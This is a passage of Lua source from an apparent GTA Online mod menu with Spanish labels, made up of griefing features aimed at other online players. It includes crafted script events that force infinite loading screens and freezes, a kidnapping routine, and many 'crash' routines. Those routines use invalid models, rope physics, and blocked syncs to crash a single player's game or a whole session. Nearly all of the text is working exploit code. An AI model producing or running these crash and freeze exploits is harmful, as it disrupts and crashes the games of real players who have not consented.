        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 10, -2)
        local rot = ENTITY.GET_ENTITY_ROTATION(ped, 2)
        STREAMING.REQUEST_MODEL(ramp_hash)
    	while not STREAMING.HAS_MODEL_LOADED(ramp_hash) do
    		util.yield()
    	end

        local ramp = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)

        ENTITY.SET_ENTITY_VISIBLE(ramp, false)
        ENTITY.SET_ENTITY_ROTATION(ramp, rot.x, rot.y, rot.z + 90, 0, true)
        util.yield(1000)
        entities.delete_by_handle(ramp)
    end)

    menu.action(trolling,"Secuestrar Jugador", {}, "", function()
        veh_to_attach = 1
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)

            util.yield(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)


        end
	end)

    local inf_loading = menu.list(trolling, "Pantalla de carga infinita", {}, "")
    menu.action(inf_loading, "Teleport a MC", {}, "", function()
        util.trigger_script_event(1 << player_id, {879177392, player_id, 0, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(player_id), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})    
    end)

    menu.action(inf_loading, "Metodo Apartamento", {}, "", function()
        util.trigger_script_event(1 << player_id , {434937615, player_id, 0, 1})
    end)
        
    menu.action_slider(inf_loading, "Telefono corrupto", {}, "Click para seleccionar un estilo", invites, function(index, name)
        switch name do
            case 1:
                util.trigger_script_event(1 << player_id, {-1891171016, player_id, 1})
                util.toast("Invitacion a yate")
            break
            case 2:
                util.trigger_script_event(1 << player_id, {-1891171016, player_id, 2})
                util.toast("Invitacion a oficina")
            break
            case 3:
                util.trigger_script_event(1 << player_id, {-1891171016, player_id, 3})
                util.toast("Invitacion al club")
            break
            case 4:
                util.trigger_script_event(1 << player_id, {-1891171016, player_id, 4})
                util.toast("Invitacion al garage de oficina")
            break
            case 5:
                util.trigger_script_event(1 << player_id, {-1891171016, player_id, 5})
                util.toast("Invitacion a los santos cs")
            break
            case 6:
                util.trigger_script_event(1 << player_id, {-1891171016, player_id, 6})
                util.toast("Invitacion a apartamento")
            break
        end
    end)


    local freeze = menu.list(malicious, "Metodos de Frezeo", {}, "")

    player_toggle_loop(freeze, player_id, "Freeze de Escena", {}, "Funciona mejor que los demas.", function()
        util.trigger_script_event(1 << player_id , {434937615, player_id, 0, 1})
    end)

    player_toggle_loop(freeze, player_id, "Freeze Escena 2", {}, "Mas parcheado que el primero.", function()
        util.trigger_script_event(1 << player_id, {-93722397, player_id, 0, 0, 0, 0, 0})
        util.yield(500)
    end)
    
    player_toggle_loop(freeze, player_id, "Freeze V1", {}, "Funciona bien contra menus gratuitos.", function()
        util.trigger_script_event(1 << player_id, {434937615, player_id, 0, 1, 0, 0})
        util.yield(500)
    end)

    player_toggle_loop(freeze, player_id, "Freeze Nativo", {}, "Es practicamente inutil en la mayoria de menus.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(player_id)
    end)

    player_toggle_loop(freeze, player_id, "Freeze Potente", {}, "Tira todos al mismo tiempo.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        util.trigger_script_event(1 << player_id, {-93722397, player_id, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << player_id, {434937615, player_id, 0, 1, 0, 0})
        util.trigger_script_event(1 << player_id , {434937615, player_id, 0, 1})
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(player_id)
        util.yield(500)
    end)




    --local options <const> = {"Lazer", "Mammatus",  "Cuban800"}
	--menu.action_slider(malicious, ("Kamikaze"), {}, "", options, function (index, plane)
	--	local hash <const> = util.joaat(plane)
	--	request_model(hash)
	--	local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
	--	local pos = players.get_position(targetPed, 20.0, 20.0)
	--	pos.z = pos.z + 30.0
	--	local plane = entities.create_vehicle(hash, pos, 0.0)
	--	players.get_position(plane, targetPed, true)
	--	VEHICLE.SET_VEHICLE_FORWARD_SPEED(plane, 150.0)
	--	VEHICLE.CONTROL_LANDING_GEAR(plane, 3)
	--end)

    glitchiar = menu.list(trolling, "Opciones De Glitch", {}, "")


    player_toggle_loop(glitchiar, player_id, "Movimiento Bug", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("prop_shuttering03")
        ryze.request_model(glitch_hash)
        local dumb_object_front = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 1, 0))
        local dumb_object_back = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 0, 0))
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_front, false)
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_back, false)
        util.yield()
        entities.delete_by_handle(dumb_object_front)
        entities.delete_by_handle(dumb_object_back)
        util.yield()    
    end)


    local glitch_player_list = menu.list(glitchiar, "Glitchear Jugador", {"glitchdelay"}, "")
    local object_stuff = {
        names = {
            "Ferris Wheel",
            "UFO",
            "Cement Mixer",
            "Scaffolding",
            "Garage Door",
            "Big Bowling Ball",
            "Big Soccer Ball",
            "Big Orange Ball",
            "Stunt Ramp",

        },
        objects = {
            "prop_ld_ferris_wheel",
            "p_spinning_anus_s",
            "prop_staticmixer_01",
            "prop_towercrane_02a",
            "des_scaffolding_root",
            "prop_sm1_11_garaged",
            "stt_prop_stunt_bowling_ball",
            "stt_prop_stunt_soccer_ball",
            "prop_juicestand",
            "stt_prop_stunt_jump_l",
        }
    }

    local object_hash = util.joaat("prop_ld_ferris_wheel")
    menu.list_select(glitch_player_list, "Objeto", {"glitchplayer"}, "Objeto para glitchearle.", object_stuff.names, 1, function(index)
        object_hash = util.joaat(object_stuff.objects[index])
    end)

    menu.slider(glitch_player_list, "Delay De Spawn", {"spawndelay"}, "", 0, 3000, 50, 10, function(amount)
        delay = amount
    end)

    local glitchPlayer = false
    local glitchPlayer_toggle
    glitchPlayer_toggle = menu.toggle(glitch_player_list, "Glitchear Jugador", {}, "", function(toggled)
        glitchPlayer = toggled

        while glitchPlayer do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("Jugador muy lejos. :c")
                menu.set_value(glitchPlayer_toggle, false);
            break end

            if not players.exists(player_id) then 
                util.toast("Jugador no existe. :c")
                menu.set_value(glitchPlayer_toggle, false);
            break end
            local glitch_hash = object_hash
            local poopy_butt = util.joaat("rallytruck")
            ryze.request_model(glitch_hash)
            ryze.request_model(poopy_butt)
            local stupid_object = entities.create_object(glitch_hash, pos)
            local glitch_vehicle = entities.create_vehicle(poopy_butt, pos, 0)
            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
            ENTITY.SET_ENTITY_VISIBLE(glitch_vehicle, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(glitch_vehicle, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(delay)
            entities.delete_by_handle(stupid_object)
            entities.delete_by_handle(glitch_vehicle)
            util.yield(delay)    
        end
    end)

    local glitchVeh = false
    local glitchVehCmd
    glitchVehCmd = menu.toggle(glitchiar, "Glitchear Coche", {"glitchvehicle"}, "", function(toggle) -- jinx <3
        glitchVeh = toggle
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_model = players.get_vehicle_model(player_id)
        local ped_hash = util.joaat("a_m_m_acult_01")
        local object_hash = util.joaat("prop_ld_ferris_wheel")
        ryze.request_model(ped_hash)
        ryze.request_model(object_hash)
        
        while glitchVeh do
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("Jugador muh lejos. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not players.exists(player_id) then 
                util.toast("El jugador no existe. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then 
                util.toast("El jugador no esta en un coche. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                util.toast("No hay asientos disponibles. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
            local glitch_obj = entities.create_object(object_hash, pos)
            local glitched_ped = entities.create_ped(26, ped_hash, pos, 0)
            local things = {glitched_ped, glitch_obj}

            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitched_ped)

            ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)

            for i, spawned_objects in ipairs(things) do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
                ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
                ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
            end

            for i = 0, seat_count -1 do
                if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                    local emptyseat = i
                    for l = 1, 25 do
                        PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                        ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                        util.yield()
                    end
                end
            end
            if not menu.get_value(glitchVehCmd) then
                entities.delete_by_handle(glitched_ped)
                entities.delete_by_handle(glitch_obj)
            end
            if glitched_ped ~= nil then
                entities.delete_by_handle(glitched_ped) 
            end
            if glitch_obj ~= nil then 
                entities.delete_by_handle(glitch_obj)
            end
        end
    end)

    menu.action_slider(glitchiar, "Lanzar Coche De Jugador", {}, "", launch_vehicle, function(index, value)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            util.toast("No esta en un vehiculo. D:")
            return
        end

        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            util.yield()
        end

        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
            util.toast("No se puede controlar el vehiculo. D:")
            return
        end

        switch value do
            case "Lanzar Arriba":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Adelante":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Atras":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, -100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Abajo":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, -100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Catapulta":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            end
        end)





    local crashes = menu.list(malicious, "Crasheos", {}, "Crasheos Op", function(); end)

    local begcrash = {
		"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Please close your game, please please please please please",
	}

    menu.action(crashes, "Crasheo de Frames", {}, "Bloqueado por menus populares", function()
		menu.trigger_commands("smstext" .. PLAYER.GET_PLAYER_NAME(player_id).. " " .. begcrash[math.random(1, #begcrash)])
		util.yield()
		menu.trigger_commands("smssend" .. PLAYER.GET_PLAYER_NAME(player_id))
	end)

    -- Prisuhm crash
    menu.action(crashes, "Modelo V1", {"crashv1"}, "Funcando (Menus populares - Stand)", function()
        local mdl = util.joaat('a_c_poodle')
        ryze.BlockSyncs(player_id, function()
            if ryze.request_model(mdl, 2) then
                local pos = players.get_position(player_id)
                util.yield(100)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 3, 0), 0) 
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1500)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(1000)
            else
                util.toast("Error al cargar modelo.")
            end
        end)
    end)

    --menu.action(crashes, "Test", {""}, "", function()
    --    local user = players.user()
    --    local user_ped = players.user_ped()
    --    local pos = players.get_position(user)
    --    BlockSyncs(player_id, function() 
    --        util.yield(100)
    --        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    --        util.yield()
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    --        util.yield(250)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    --        util.yield(1000)
    --        for i = 1, 5 do
    --            util.spoof_script("freemode", SYSTEM.WAIT)
    --        end
    --        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    --        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
    --    end)
    --end)

    menu.divider(crashes, "(Sesion)")

    local sescrashes = menu.list(crashes, "Crasheos Para Sesion", {}, "")

    menu.action(sescrashes, "Crashear Sesion V1", {}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local hashes = {2132890591, 2727244247}
        local pc = players.get_position(player_id)
        local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
        local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
        local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
        local vehc = ENTITY.GET_ENTITY_COORDS(veh); local pedc = ENTITY.GET_ENTITY_COORDS(ped)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
        util.yield(1000)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        entities.delete_by_handle(veh); entities.delete_by_handle(ped)
        PHYSICS.DELETE_CHILD_ROPE(rope)
        PHYSICS.ROPE_UNLOAD_TEXTURES()
    end)

    menu.action(sescrashes, "Crashear Sesion V2", {}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        pos.x = pos.x+5
        ppos.z = ppos.z+1
        cargobob = entities.create_vehicle(2132890591, pos, 0)
        cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
        kur = entities.create_ped(26, 2727244247, ppos, 0)
        kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
        ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
        newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    end)

    menu.action(sescrashes, "Crashear Sesion V3", {}, "", function()
        for i = 1, 10 do
            util.trigger_script_event(1 << player_id, {243072129, player_id, 1, player_id, 0, 1, 0})  
        end
    end)

    menu.action(sescrashes, "5G Para Sesion", {}, "5G?", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
    end)

    menu.action(sescrashes, "AIO Para Sesion", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pc.x, pc.y, pc.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', 1, 10000, 0)
            end
            util.yield_once()
        end
    end)



    menu.divider(crashes, "(Ryze Exclusivo)")

    menu.action(crashes, "Crasheo V1", {}, "Crasheo chino.", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local mdl = util.joaat("cs_taostranslator2")
        while not STREAMING.HAS_MODEL_LOADED(mdl) do
            STREAMING.REQUEST_MODEL(mdl)
            util.yield(5)
        end

        local ped = {}
        for i = 1, 10 do 
            local coord = ENTITY.GET_ENTITY_COORDS(player, true)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            ped[i] = entities.create_ped(0, mdl, coord, 0)

            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)

            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(player_id) .. " explode " .. PLAYER.GET_PLAYER_NAME(player_id) .. " ")

            ENTITY.SET_ENTITY_VISIBLE(ped[i], true)
            util.yield(25)
        end
        util.yield(2500)
        for i = 1, 10 do
            entities.delete_by_handle(ped[i])
            util.yield(25)
        end

    end)

    menu.action(crashes, "Crasheo V2", {}, "Crasheo potente.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local my_pos = ENTITY.GET_ENTITY_COORDS(user)
        local anim_dict = ("anim@mp_player_intupperstinker")
        ryze.anim_request(anim_dict)
        ryze.BlockSyncs(player_id, function()
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            util.yield(100)
            TASK.TASK_SWEEP_AIM_POSITION(user, anim_dict, "toma", "puto", "tonto", -1, 0.0, 0.0, 0.0, 0.0, 0.0)
            util.yield(100)
        end)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, my_pos.x, my_pos.y, my_pos.z, false, false, false)

    end)

    menu.action(crashes, "Crasheo Marijuana", {"crashv14"}, "", function(on_loop)
        local cord = players.get_position(player_id)
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
        end
        util.toast("Terminado.")
    end)

    menu.action(crashes, "Cars Crash", {"crashv13"}, "", function(on_toggle)
        local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
        local vehicles = {}
        for i = 1, 4 do
            util.create_thread(function()
                ryze.request_model(hashes[i])
                local pcoords = players.get_position(player_id)
                local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
                for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                for j = 0, 49 do
                    local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                    VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                    VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
                end
                for j = 0, 20 do
                    if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
                end
                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
                VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
                for ai = 1, 50 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    pcoords = players.get_position(player_id)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                    util.yield()
                end
                vehicles[#vehicles+1] = veh
            end)
        end
        util.yield(2000)
        for _, v in pairs(vehicles) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
            entities.delete_by_handle(v)
        end
    end)

    
    --[[
            menu.toggle(crashes, "Crasheo V2 'Test'", {}, "Crasheo alberca >.<", function(on)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if on then
            trigger_command("godmode on")
            util.yield(10)
            trigger_command("otr on")
            util.yield(10)
            trigger_command("invisibility on")
            util.yield(50)
    
            
    
            ENTITY.ATTACH_ENTITY_TO_ENTITY(PLAYER.PLAYER_PED_ID(), p, 0, 0, 0, 0, 0, 0, 0, false, true, false, false, 0, true)
            trigger_command("mpfemale")
            util.yield(25)
            trigger_command("mpmale")
            util.yield(25)
            if not players.exists(pid) then
                PackPoolCrash = false
            end

        else
            ryze.PapuCrash = false
            util.yield(25)
            ENTITY.DETACH_ENTITY(PLAYER.PLAYER_PED_ID(), true, false)
            trigger_command("godmode off")
            util.yield(10)
            trigger_command("otr off")
            util.yield(10)
            trigger_command("invisibility off")
            util.yield(10)
            trigger_command("outfitdefault")
        end
    end)

    ]]

    local twotake = menu.list(crashes, "2T1 Crashes", {}, "")

    local modelc = menu.list(twotake, "Crasheos Por Modelo", {}, "")


    menu.action(modelc, "Modelo Invalido V1", {"crashv4"}, "", function()
        ryze.BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)
    end)

    menu.action(modelc, "Modelo Invalido V2", {"crashv5"}, "", function()
        ryze.BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
